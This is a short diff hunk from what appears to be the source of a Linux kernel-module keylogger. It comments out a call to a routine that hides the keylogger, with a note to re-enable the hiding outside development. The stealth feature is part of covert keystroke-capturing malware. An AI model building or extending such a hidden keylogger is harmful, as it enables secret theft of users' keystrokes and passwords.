@@ -218,7 +218,7 @@ static int init_keylogger(void)
 	printk(KERN_INFO "[TIME-LOG (time_t): %s]\n",(key_buf.time_string));
 
 	//Uncomment to hide keylogger, but dont do it on development
-	hide_keylogger();
+	//hide_keylogger();
 
 	return create_keylogger_file();
 }
